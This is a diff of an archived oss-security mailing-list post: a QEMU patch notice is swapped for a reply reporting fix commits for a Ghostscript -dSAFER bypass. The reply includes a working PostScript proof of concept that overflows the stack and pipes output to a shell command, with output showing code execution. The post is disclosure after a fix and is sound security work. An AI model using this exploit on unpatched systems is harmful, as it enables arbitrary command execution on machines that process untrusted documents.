@@ -1,20 +1,76 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/31/2
-Message-ID: <nycvar.YSQ.7.76.1801311406110.22220@wniryva>
-Date: Wed, 31 Jan 2018 14:10:57 +0530 (IST)
-From: P J P <ppandit@...hat.com>
-To: oss security list <oss-security@...ts.openwall.com>
-Subject: Re: Re: CVE-2017-16845 Qemu: ps2: information leakage via post_load routine
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/09/2
+Message-ID: <CAJ_zFkLHvDnU2=USrZm2Dtjt0WPfdnqHC2K5q52xCR+qQ7MEpw@mail.gmail.com>
+Date: Sun, 9 Sep 2018 12:27:26 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
 Content-Type: text/plain; charset=utf-8
 
-+-- On Wed, 22 Nov 2017, P J P wrote --+
-|   -> https://lists.gnu.org/archive/html/qemu-devel/2017-11/msg02946.html
-| It should make it upstream soon, I'll update here accordingly.
+[resending post that bounced]
 
-Upstream patch
-  -> https://git.qemu.org/?p=qemu.git;a=commitdiff;h=802cbcb73002b92e6ddc8464d39b668a71b78d74
+Another update, that bypass is now fixed with these commits:
 
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
+http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=3e5d316b72e3965b7968bb1d96baa137cd063ac6
+http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=643b24dbd002
+
+The problem was that the previous
+<http://git.ghostscript.com/?p=ghostpdl.git&a=commitdiff&h=5812b1b78fc4> commit
+relied on catching any errors, then restoring a sane state in the error
+handler. That won't work, because the trusted code shares the same operand
+stack with untrusted code, so you can (for example) just fill it up with
+junk and cause a stack overflow. That causes the stopped proc to stop,
+leaving the page device in insecure state ("stopped" is the PostScript
+equivalent of "threw an exception").
+
+Here is a test case:
+
+%!PS
+% This is bug 699718, trysetparams stopped proc can itself stop, leaving
+page device in insecure state
+currentpagedevice /PageSize get 0 (foobar) put
+a0
+% fill up the stack with junk, so the error handler generates a
+/stackoverflow
+0 1 300360 {} for
+{ grestore } stopped clear
+(ppmraw) selectdevice
+mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+showpage
+
+$ ./gs -dSAFER bug699718.txt
+GPL Ghostscript GIT PRERELEASE 9.25 (2018-09-03)
+Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
+This software comes with NO WARRANTY: see the file PUBLIC for details.
+uid=1000(taviso) gid=1000(primarygroup)
+
+I dunno if I believe there are no other ways to make that fail, I'll think
+about it. I can see there are bunch more security related commits in git
+that are not from my reports, so I guess there are more on the way anyway.
+
+Tavis.
+
+On Thu, Sep 6, 2018 at 9:27 AM Leonid Isaev <leonid.isaev@...a.colorado.edu>
+wrote:
+
+> On Thu, Sep 06, 2018 at 03:17:25PM +0200, Jakub Wilk wrote:
+> > * Leonid Isaev <leonid.isaev@...a.colorado.edu>, 2018-09-05, 17:32:
+> > > pdf files can contains things like javascript...
+> >
+> > Do any open-source PDF browsers actually execute embedded JS?
+>
+> Currently, evince, okular and gv don't. The same goes for zathura with its
+> poppler backend (haven't checked this, but pretty sure). But then there is
+> also
+> Artifex Mupdf which, AFAIR, supports JS in pdf files (by extension, so does
+> zathura when viewing a pdf file using the mupdf plugin). I don't know how
+> complete that support is. Most importantly, many Android pdf/ebook readers
+> probably include JS support.
+>
+> CHeers,
+> L.
+>
+> --
+> Leonid Isaev
+>
+
